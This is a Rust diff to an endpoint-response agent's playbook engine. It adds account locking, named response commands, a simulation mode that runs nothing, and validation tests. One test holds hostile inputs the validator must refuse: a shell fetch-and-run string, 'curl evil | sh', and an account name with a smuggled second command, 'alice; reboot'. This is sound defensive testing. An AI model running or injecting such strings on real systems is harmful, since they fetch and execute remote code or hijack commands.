@@ -49,6 +49,30 @@ pub enum ResolvedAction {
     IsolateHost {
         duration_secs: u64,
     },
+    /// Lock a local account. `duration_secs` 0: until an administrator
+    /// unlocks it.
+    DisableAccount {
+        user: String,
+        duration_secs: u64,
+    },
+    /// Run a response command declared in the agent's configuration, giving
+    /// it `context` (what the playbook matched).
+    RunCommand {
+        name: String,
+        context: serde_json::Value,
+    },
+}
+
+/// An account lock lasts this long when the playbook action gives no duration.
+pub const DEFAULT_ACCOUNT_LOCK_SECS: u64 = 3600;
+
+/// Duration of a "lock account" action, from its parameter (seconds; `0`:
+/// until unlocked; blank or unreadable: [`DEFAULT_ACCOUNT_LOCK_SECS`]).
+pub fn account_lock_duration(parameters: &str) -> u64 {
+    parameters
+        .trim()
+        .parse::<u64>()
+        .unwrap_or(DEFAULT_ACCOUNT_LOCK_SECS)
 }
 
 /// Isolation lasts this long when the playbook action gives no duration.
@@ -95,6 +119,9 @@ pub struct NetworkAlertInfo {
     pub port: Option<u16>,
     pub severity: String,
     pub description: String,
+    /// The account the alert is about, when it names one (a session opened
+    /// after a brute force names the account that was taken).
+    pub user: Option<String>,
 }
 
 #[derive(Debug, Clone)]
@@ -189,6 +216,12 @@ pub async fn evaluate_playbook(
                                 duration_secs: 3600,
                             });
                         }
+                        if let Some(ref user) = alert.user {
+                            actions.push(ResolvedAction::DisableAccount {
+                                user: user.clone(),
+                                duration_secs: DEFAULT_ACCOUNT_LOCK_SECS,
+                            });
+                        }
                         base_confidence += 0.3;
                     }
                 }
@@ -259,8 +292,34 @@ pub async fn evaluate_playbook(
                         ResolvedAction::QuarantineFile { .. },
                         PlaybookActionType::QuarantineFile
                     ) | (ResolvedAction::BlockIp { .. }, PlaybookActionType::BlockIp)
+                        | (
+                            ResolvedAction::DisableAccount { .. },
+                            PlaybookActionType::DisableAccount
+                        )
                 )
             })
+    });
+    // The same account named by several alerts is locked once, for the time
+    // the playbook asks.
+    let lock_secs = playbook
+        .actions
+        .iter()
+        .find(|configured| {
+            configured.action_type == agent_gui::dto::PlaybookActionType::DisableAccount
+        })
+        .map(|configured| account_lock_duration(&configured.parameters));
+    let mut locked: Vec<String> = Vec::new();
+    actions.retain_mut(|action| match action {
+        ResolvedAction::DisableAccount {
+            user,
+            duration_secs,
+        } => {
+            *duration_secs = lock_secs.unwrap_or(DEFAULT_ACCOUNT_LOCK_SECS);
+            let first = !locked.contains(user);
+            locked.push(user.clone());
+            first
+        }
+        _ => true,
     });
     if actually_triggered {
         for configured in &playbook.actions {
@@ -273,6 +332,41 @@ pub async fn evaluate_playbook(
                 agent_gui::dto::PlaybookActionType::IsolateHost => {
                     actions.push(ResolvedAction::IsolateHost {
                         duration_secs: isolation_duration(&configured.parameters),
+                    })
+                }
+                agent_gui::dto::PlaybookActionType::RunCommand => {
+                    // What the playbook matched, for the organisation's
+                    // program to act on. Built from the targets kept above.
+                    let mut targets = serde_json::json!({
+                        "processes": [], "files": [], "addresses": [], "accounts": [],
+                    });
+                    for action in &actions {
+                        let (kind, value) = match action {
+                            ResolvedAction::KillProcess { name, pid } => {
+                                ("processes", serde_json::json!({ "name": name, "pid": pid }))
+                            }
+                            ResolvedAction::QuarantineFile { path } => {
+                                ("files", serde_json::json!(path))
+                            }
+                            ResolvedAction::BlockIp { ip, .. } => {
+                                ("addresses", serde_json::json!(ip))
+                            }
+                            ResolvedAction::DisableAccount { user, .. } => {
+                                ("accounts", serde_json::json!(user))
+                            }
+                            _ => continue,
+                        };
+                        if let Some(list) = targets[kind].as_array_mut() {
+                            list.push(value);
+                        }
+                    }
+                    actions.push(ResolvedAction::RunCommand {
+                        name: configured.parameters.trim().to_string(),
+                        context: serde_json::json!({
+                            "playbook": playbook.name,
+                            "matched_conditions": matched_conditions,
+                            "targets": targets,
+                        }),
                     })
                 }
                 agent_gui::dto::PlaybookActionType::SendSiemAlert => {
@@ -387,6 +481,8 @@ fn is_destructive(action: &ResolvedAction) -> bool {
             | ResolvedAction::QuarantineFile { .. }
             | ResolvedAction::BlockIp { .. }
             | ResolvedAction::IsolateHost { .. }
+            | ResolvedAction::DisableAccount { .. }
+            | ResolvedAction::RunCommand { .. }
     )
 }
 
@@ -426,9 +522,65 @@ fn validate_target(action: &ResolvedAction) -> Result<(), String> {
             }
             Ok(())
         }
+        ResolvedAction::DisableAccount { user, .. } => {
+            // Which account may be locked is decided where it is locked;
+            // here only what cannot be an account name is turned away.
+            let named = !user.is_empty()
+                && user.len() <= 64
+                && !user.starts_with('-')
+                && user
+                    .chars()
+                    .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-'));
+            if named {
+                Ok(())
+            } else {
+                Err(format!("refusing '{}': not an account name", user))
+            }
+        }
+        ResolvedAction::RunCommand { name, .. } => {
+            if crate::edr_actions::response_command::is_command_name(name) {
+                Ok(())
+            } else {
+                Err(format!(
+                    "refusing '{}': a playbook names a response command, it does not carry one",
+                    name
+                ))
+            }
+        }
         _ => Ok(()),
     }
 }
+
+/// How an action reads in results, logs and the audit trail.
+fn describe(action: &ResolvedAction) -> String {
+    match action {
+        ResolvedAction::KillProcess { name, pid } => {
+            format!("Kill process {} (PID {})", name, pid)
+        }
+        ResolvedAction::QuarantineFile { path } => format!("Quarantine {}", path),
+        ResolvedAction::BlockIp { ip, .. } => format!("Block IP {}", ip),
+        ResolvedAction::IsolateHost { duration_secs: 0 } => {
+            "Isolate host until released".to_string()
+        }
+        ResolvedAction::IsolateHost { duration_secs } => {
+            format!("Isolate host for {}s", duration_secs)
+        }
+        ResolvedAction::DisableAccount {
+            user,
+            duration_secs: 0,
+        } => format!("Lock account {} until unlocked", user),
+        ResolvedAction::DisableAccount {
+            user,
+            duration_secs,
+        } => format!("Lock account {} for {}s", user, duration_secs),
+        ResolvedAction::RunCommand { name, .. } => format!("Run response command '{}'", name),
+        ResolvedAction::Alert { title, .. } => format!("Alert: {}", title),
+        ResolvedAction::Notify { message } => format!("Notify: {}", message),
+    }
+}
+
+/// Marks, in results and logs, an action that was simulated and not run.
+pub const SIMULATION_PREFIX: &str = "[Simulation] ";
 
 /// Execute playbook actions and collect results.
 pub async fn execute_playbook_actions(
@@ -447,6 +599,39 @@ pub async fn execute_playbook_actions_with_delivery(
     audit_trail: Option<&std::sync::Arc<crate::audit_trail::LocalAuditTrail>>,
     notifications: Option<&std::sync::mpsc::Sender<agent_gui::events::AgentEvent>>,
     siem: Option<&agent_siem::SiemForwarder>,
+) -> Vec<ActionResult> {
+    run_playbook_actions(
+        playbook_name,
+        actions,
+        audit_trail,
+        notifications,
+        siem,
+        false,
+    )
+    .await
+}
+
+/// Record what the actions would do, without doing any of it: nothing is
+/// killed, quarantined, blocked, isolated, notified or sent to the SIEM.
+///
+/// Targets are checked and the destructive-action limit applies exactly as
+/// in a real run, so the result also shows which actions would be refused.
+/// Each simulated action is labelled with [`SIMULATION_PREFIX`].
+pub async fn simulate_playbook_actions(
+    playbook_name: &str,
+    actions: &[ResolvedAction],
+    audit_trail: Option<&std::sync::Arc<crate::audit_trail::LocalAuditTrail>>,
+) -> Vec<ActionResult> {
+    run_playbook_actions(playbook_name, actions, audit_trail, None, None, true).await
+}
+
+async fn run_playbook_actions(
+    playbook_name: &str,
+    actions: &[ResolvedAction],
+    audit_trail: Option<&std::sync::Arc<crate::audit_trail::LocalAuditTrail>>,
+    notifications: Option<&std::sync::mpsc::Sender<agent_gui::events::AgentEvent>>,
+    siem: Option<&agent_siem::SiemForwarder>,
+    simulate: bool,
 ) -> Vec<ActionResult> {
     let mut results = Vec::new();
     let mut destructive_executed = 0usize;
@@ -484,126 +669,103 @@ pub async fn execute_playbook_actions_with_delivery(
             }
         }
 
-        let result = match action {
-            ResolvedAction::KillProcess { name, pid } => {
-                match crate::edr_actions::kill_process(name, *pid).await {
-                    Ok(()) => ActionResult {
-                        action: format!("Kill process {} (PID {})", name, pid),
-                        success: true,
-                        error: None,
-                    },
-                    Err(e) => ActionResult {
-                        action: format!("Kill process {} (PID {})", name, pid),
-                        success: false,
-                        error: Some(e.to_string()),
-                    },
-                }
-            }
-            ResolvedAction::QuarantineFile { path } => {
-                match crate::edr_actions::quarantine_file(path).await {
-                    Ok(_id) => ActionResult {
-                        action: format!("Quarantine {}", path),
-                        success: true,
-                        error: None,
-                    },
-                    Err(e) => ActionResult {
-                        action: format!("Quarantine {}", path),
-                        success: false,
-                        error: Some(e.to_string()),
-                    },
-                }
-            }
-            ResolvedAction::BlockIp { ip, duration_secs } => {
-                match crate::edr_actions::block_ip(ip, *duration_secs).await {
-                    Ok(()) => ActionResult {
-                        action: format!("Block IP {}", ip),
-                        success: true,
-                        error: None,
-                    },
-                    Err(e) => ActionResult {
-                        action: format!("Block IP {}", ip),
-                        success: false,
-                        error: Some(e.to_string()),
-                    },
-                }
-            }
-            ResolvedAction::IsolateHost { duration_secs } => {
-                let label = if *duration_secs == 0 {
-                    "Isolate host until released".to_string()
-                } else {
-                    format!("Isolate host for {}s", duration_secs)
-                };
-                let reason = format!("Playbook '{}'", playbook_name);
-                match crate::host_isolation::isolate_host(&reason, *duration_secs).await {
-                    Ok(_) => ActionResult {
-                        action: label,
-                        success: true,
-                        error: None,
-                    },
-                    Err(e) => ActionResult {
-                        action: label,
-                        success: false,
-                        error: Some(e.to_string()),
-                    },
-                }
-            }
-            ResolvedAction::Alert {
-                title,
-                severity,
-                description,
-            } => {
-                let outcome = if let Some(forwarder) = siem {
-                    let event = agent_siem::SiemEvent {
-                        timestamp: chrono::Utc::now(),
-                        severity: severity_rank(severity).unwrap_or(2) * 2 + 1,
-                        category: agent_siem::EventCategory::Security,
-                        name: title.clone(),
-                        description: description.clone(),
-                        source_host: hostname::get()
-                            .map(|h| h.to_string_lossy().into_owned())
-                            .unwrap_or_default(),
-                        source_ip: None,
-                        destination_ip: None,
-                        destination_port: None,
-                        user: None,
-                        process_name: None,
-                        process_id: None,
-                        file_path: None,
-                        custom_fields: serde_json::json!({"playbook":playbook_name}),
-                        event_id: uuid::Uuid::new_v4().to_string(),
-                        agent_version: agent_common::constants::AGENT_VERSION.to_string(),
-                    };
-                    forwarder
-                        .send_required_event(&event)
+        let label = describe(action);
+        let outcome: Result<(), String> = if simulate {
+            Ok(())
+        } else {
+            match action {
+                ResolvedAction::KillProcess { name, pid } => {
+                    crate::edr_actions::kill_process(name, *pid)
                         .await
                         .map_err(|e| e.to_string())
-                } else {
-                    Err("No SIEM delivery destination configured".to_string())
-                };
-                ActionResult {
-                    action: format!("Alert: {}", title),
-                    success: outcome.is_ok(),
-                    error: outcome.err(),
+                }
+                ResolvedAction::QuarantineFile { path } => {
+                    crate::edr_actions::quarantine_file(path)
+                        .await
+                        .map(drop)
+                        .map_err(|e| e.to_string())
+                }
+                ResolvedAction::BlockIp { ip, duration_secs } => {
+                    crate::edr_actions::block_ip(ip, *duration_secs)
+                        .await
+                        .map_err(|e| e.to_string())
+                }
+                ResolvedAction::IsolateHost { duration_secs } => {
+                    let reason = format!("Playbook '{}'", playbook_name);
+                    crate::host_isolation::isolate_host(&reason, *duration_secs)
+                        .await
+                        .map(drop)
+                        .map_err(|e| e.to_string())
+                }
+                ResolvedAction::DisableAccount {
+                    user,
+                    duration_secs,
+                } => crate::edr_actions::account::disable_account(user, *duration_secs)
+                    .await
+                    .map_err(|e| e.to_string()),
+                ResolvedAction::RunCommand { name, context } => {
+                    crate::edr_actions::response_command::run_response_command(name, context)
+                        .await
+                        .map_err(|e| e.to_string())
+                }
+                ResolvedAction::Alert {
+                    title,
+                    severity,
+                    description,
+                } => {
+                    if let Some(forwarder) = siem {
+                        let event = agent_siem::SiemEvent {
+                            timestamp: chrono::Utc::now(),
+                            severity: severity_rank(severity).unwrap_or(2) * 2 + 1,
+                            category: agent_siem::EventCategory::Security,
+                            name: title.clone(),
+                            description: description.clone(),
+                            source_host: hostname::get()
+                                .map(|h| h.to_string_lossy().into_owned())
+                                .unwrap_or_default(),
+                            source_ip: None,
+                            destination_ip: None,
+                            destination_port: None,
+                            user: None,
+                            process_name: None,
+                            process_id: None,
+                            file_path: None,
+                            custom_fields: serde_json::json!({"playbook":playbook_name}),
+                            event_id: uuid::Uuid::new_v4().to_string(),
+                            agent_version: agent_common::constants::AGENT_VERSION.to_string(),
+                        };
+                        forwarder
+                            .send_required_event(&event)
+                            .await
+                            .map_err(|e| e.to_string())
+                    } else {
+                        Err("No SIEM delivery destination configured".to_string())
+                    }
+                }
+                ResolvedAction::Notify { message } => {
+                    if let Some(tx) = notifications {
+                        tx.send(agent_gui::events::AgentEvent::Notification {
+                            notification: agent_gui::dto::GuiNotification::info(
+                                playbook_name,
+                                message.clone(),
+                            ),
+                        })
+                        .map_err(|e| e.to_string())
+                    } else {
+                        Err("No notification delivery destination configured".to_string())
+                    }
                 }
             }
-            ResolvedAction::Notify { message } => {
-                let outcome = if let Some(tx) = notifications {
-                    tx.send(agent_gui::events::AgentEvent::Notification {
-                        notification: agent_gui::dto::GuiNotification::info(
-                            playbook_name,
-                            message.clone(),
-                        ),
-                    })
-                    .map_err(|e| e.to_string())
-                } else {
-                    Err("No notification delivery destination configured".to_string())
-                };
-                ActionResult {
-                    action: format!("Notify: {}", message),
-                    success: outcome.is_ok(),
-                    error: outcome.err(),
-                }
-            }
+        };
+
+        let result = ActionResult {
+            action: if simulate {
+                format!("{SIMULATION_PREFIX}{label}")
+            } else {
+                label
+            },
+            success: outcome.is_ok(),
+            error: outcome.err(),
         };
 
         if let Some(trail) = audit_trail {
@@ -790,7 +952,9 @@ mod guard_tests {
 #[cfg(test)]
 mod tests {
     use super::*;
-    use agent_gui::dto::{Playbook, PlaybookCondition, PlaybookConditionType};
+    use agent_gui::dto::{
+        Playbook, PlaybookAction, PlaybookActionType, PlaybookCondition, PlaybookConditionType,
+    };
 
     fn make_playbook(conditions: Vec<PlaybookCondition>) -> Playbook {
         Playbook {
@@ -845,6 +1009,7 @@ mod tests {
                 port: None,
                 severity: "high".into(),
                 description: "test".into(),
+                user: None,
             }],
             ..Default::default()
         };
@@ -858,6 +1023,7 @@ mod tests {
             None,
             None,
             None,
+            false,
         )
         .await;
         assert!(result.rule_matches.is_empty());
@@ -1085,5 +1251,304 @@ mod tests {
                 .any(|a| matches!(a, ResolvedAction::KillProcess { pid: 5678, .. })),
             "non-matching process must be spared"
         );
+    }
+
+    // ── simulation ──────────────────────────────────────────────────────
+
+    #[tokio::test]
+    async fn simulation_labels_every_action_and_delivers_none() {
+        let actions = vec![
+            ResolvedAction::KillProcess {
+                name: "evil_miner".into(),
+                pid: 4242,
+            },
+            ResolvedAction::QuarantineFile {
+                path: "/tmp/evil.bin".into(),
+            },
+            ResolvedAction::BlockIp {
+                ip: "203.0.113.7".into(),
+                duration_secs: 3600,
+            },
+            ResolvedAction::IsolateHost { duration_secs: 0 },
+            ResolvedAction::Notify {
+                message: "seen".into(),
+            },
+        ];
+        let results = simulate_playbook_actions("sim", &actions, None).await;
+
+        assert_eq!(
+            results
+                .iter()
+                .map(|r| r.action.as_str())
+                .collect::<Vec<_>>(),
+            [
+                "[Simulation] Kill process evil_miner (PID 4242)",
+                "[Simulation] Quarantine /tmp/evil.bin",
+                "[Simulation] Block IP 203.0.113.7",
+                "[Simulation] Isolate host until released",
+                "[Simulation] Notify: seen",
+            ]
+        );
+        // Would run: no destination or privilege is needed to say so.
+        assert!(results.iter().all(|r| r.success && r.error.is_none()));
+    }
+
+    /// What a brute force that succeeded leaves the playbook with: the
+    /// address it came from and the account it took.
+    fn brute_force_context() -> ThreatContext {
+        ThreatContext {
+            suspicious_processes: vec![],
+            network_alerts: vec![
+                NetworkAlertInfo {
+                    remote_ip: Some("203.0.113.9".to_string()),
+                    port: None,
+                    severity: "critical".to_string(),
+                    description: "Sigma: Connexion SSH réussie après une attaque par force brute"
+                        .to_string(),
+                    user: Some("deploy".to_string()),
+                },
+                // The burst that came before names no account that was taken.
+                NetworkAlertInfo {
+                    remote_ip: Some("203.0.113.9".to_string()),
+                    port: None,
+                    severity: "high".to_string(),
+                    description: "Sigma: Attaque par force brute SSH".to_string(),
+                    user: None,
+                },
+            ],
+            fim_alerts: vec![],
+        }
+    }
+
+    fn on_critical_network_alert(actions: &[(PlaybookActionType, &str)]) -> Playbook {
+        let mut playbook = make_playbook(vec![PlaybookCondition {
+            condition_type: PlaybookConditionType::NetworkAlertType,
+            operator: "any".to_string(),
+            value: "critical".to_string(),
+        }]);
+        playbook.actions = actions
+            .iter()
+            .map(|(action_type, parameters)| PlaybookAction {
+                action_type: *action_type,
+                parameters: (*parameters).to_string(),
+            })
+            .collect();
+        playbook
+    }
+
+    #[tokio::test]
+    async fn the_account_an_alert_names_is_locked_only_when_the_playbook_says_so() {
+        let context = brute_force_context();
+
+        let lock = on_critical_network_alert(&[
+            (PlaybookActionType::BlockIp, ""),
+            (PlaybookActionType::DisableAccount, "900"),
+        ]);
+        let evaluation = eval(&lock, &context).await;
+        let described: Vec<String> = evaluation.actions.iter().map(describe).collect();
+        assert_eq!(
+            described,
+            ["Block IP 203.0.113.9", "Lock account deploy for 900s"]
+        );
+
+        // The same alert, a playbook that only blocks: no account is touched.
+        let block_only = on_critical_network_alert(&[(PlaybookActionType::BlockIp, "")]);
+        let evaluation = eval(&block_only, &context).await;
+        assert!(
+            evaluation
+                .actions
+                .iter()
+                .all(|action| !matches!(action, ResolvedAction::DisableAccount { .. }))
+        );
+
+        // No duration given: an hour. Zero: until an administrator unlocks.
+        for (parameter, expected) in [("", "for 3600s"), ("0", "until unlocked")] {
+            let playbook =
+                on_critical_network_alert(&[(PlaybookActionType::DisableAccount, parameter)]);
+            let evaluation = eval(&playbook, &context).await;
+            assert_eq!(evaluation.actions.len(), 1);
+            assert!(describe(&evaluation.actions[0]).ends_with(expected));
+        }
+    }
+
+    #[tokio::test]
+    async fn a_response_command_is_given_what_the_playbook_matched() {
+        let playbook = on_critical_network_alert(&[
+            (PlaybookActionType::BlockIp, ""),
+            (PlaybookActionType::DisableAccount, ""),
+            (PlaybookActionType::RunCommand, " open-ticket "),
+        ]);
+        let evaluation = eval(&playbook, &brute_force_context()).await;
+        let Some(ResolvedAction::RunCommand { name, context }) = evaluation.actions.last() else {
+            panic!("the command comes last: {:?}", evaluation.actions);
+        };
+        assert_eq!(name, "open-ticket");
+        assert_eq!(context["playbook"], "test");
+        assert_eq!(context["targets"]["addresses"][0], "203.0.113.9");
+        assert_eq!(context["targets"]["accounts"][0], "deploy");
+        assert!(
+            context["targets"]["processes"]
+                .as_array()
+                .unwrap()
+                .is_empty()
+        );
+    }
+
+    #[tokio::test]
+    async fn what_cannot_be_an_account_or_a_command_name_never_runs() {
+        let actions = vec![
+            ResolvedAction::DisableAccount {
+                user: "alice; reboot".into(),
+                duration_secs: 60,
+            },
+            ResolvedAction::DisableAccount {
+                user: "-L".into(),
+                duration_secs: 60,
+            },
+            // A playbook names a command; it does not carry one.
+            ResolvedAction::RunCommand {
+                name: "/bin/sh -c 'curl evil | sh'".into(),
+                context: serde_json::json!({}),
+            },
+        ];
+        let results = execute_playbook_actions("test", &actions, None).await;
+        assert_eq!(results.len(), 3);
+        for result in &results {
+            assert!(!result.success);
+            assert!(
+                result
+                    .error
+                    .as_deref()
+                    .is_some_and(|e| e.contains("Rejected by target validation")),
+                "{result:?}"
+            );
+        }
+
+        // A well-formed name that the configuration does not declare.
+        let undeclared = vec![ResolvedAction::RunCommand {
+            name: "not-declared".into(),
+            context: serde_json::json!({}),
+        }];
+        let results = execute_playbook_actions("test", &undeclared, None).await;
+        assert!(!results[0].success);
+        assert!(
+            results[0]
+                .error
+                .as_deref()
+                .is_some_and(|e| e.contains("no response command named"))
+        );
+    }
+
+    #[tokio::test]
+    async fn a_simulated_lock_or_command_is_described_and_not_run() {
+        let actions = vec![
+            ResolvedAction::DisableAccount {
+                user: "deploy".into(),
+                duration_secs: 0,
+            },
+            ResolvedAction::RunCommand {
+                name: "open-ticket".into(),
+                context: serde_json::json!({}),
+            },
+        ];
+        let results = simulate_playbook_actions("sim", &actions, None).await;
+        assert_eq!(
+            results
+                .iter()
+                .map(|r| r.action.as_str())
+                .collect::<Vec<_>>(),
+            [
+                "[Simulation] Lock account deploy until unlocked",
+                "[Simulation] Run response command 'open-ticket'"
+            ]
+        );
+        assert!(results.iter().all(|r| r.success));
+    }
+
+    #[tokio::test]
+    async fn simulation_reports_what_a_real_run_would_refuse() {
+        let mut actions = vec![ResolvedAction::KillProcess {
+            name: "launchd".into(),
+            pid: 1,
+        }];
+        actions.extend((0..12).map(|i| ResolvedAction::BlockIp {
+            ip: format!("203.0.113.{i}"),
+            duration_secs: 60,
+        }));
+        let results = simulate_playbook_actions("sim", &actions, None).await;
+
+        assert!(!results[0].success, "PID 1 is refused in simulation too");
+        let refused = results
+            .iter()
+            .filter(|r| {
+                r.error
+                    .as_deref()
+                    .is_some_and(|e| e.contains("destructive-action limit"))
+            })
+            .count();
+        assert_eq!(refused, 2, "the limit of a real run applies");
+    }
+
+    /// The property the mode exists for, on a real process: a simulated kill
+    /// leaves it running, the same playbook armed terminates it.
+    #[cfg(unix)]
+    #[tokio::test]
+    async fn a_simulated_playbook_changes_nothing_on_the_host() {
+        let mut child = std::process::Command::new("sleep")
+            .arg("60")
+            .spawn()
+            .expect("spawn sleep");
+        let mut pb = make_playbook(vec![PlaybookCondition {
+            condition_type: PlaybookConditionType::ProcessNameMatch,
+            operator: "any".to_string(),
+            value: "sleep".to_string(),
+        }]);
+        pb.actions.push(agent_gui::dto::PlaybookAction {
+            action_type: agent_gui::dto::PlaybookActionType::KillProcess,
+            parameters: String::new(),
+        });
+        let ctx = ThreatContext {
+            suspicious_processes: vec![proc("sleep", child.id())],
+            ..Default::default()
+        };
+        let run = |simulate: bool| {
+            let (pb, ctx) = (&pb, &ctx);
+            async move {
+                crate::threat_pipeline::run_threat_pipeline(
+                    &[],
+                    std::slice::from_ref(pb),
+                    ctx,
+                    &None,
+                    #[cfg(feature = "llm")]
+                    None,
+                    None,
+                    None,
+                    simulate,
+                )
+                .await
+            }
+        };
+
+        let simulated = run(true).await;
+        assert_eq!(simulated.playbook_logs.len(), 1);
+        assert_eq!(
+            simulated.playbook_logs[0].actions_executed,
+            [format!(
+                "[Simulation] Kill process sleep (PID {})",
+                child.id()
+            )]
+        );
+        assert!(
+            child.try_wait().unwrap().is_none(),
+            "a simulated kill must leave the process running"
+        );
+
+        let armed = run(false).await;
+        assert_eq!(
+            armed.playbook_logs[0].actions_executed,
+            [format!("Kill process sleep (PID {})", child.id())]
+        );
+        assert!(armed.playbook_logs[0].success);
+        assert!(!child.wait().unwrap().success(), "armed, it is terminated");
     }
 }
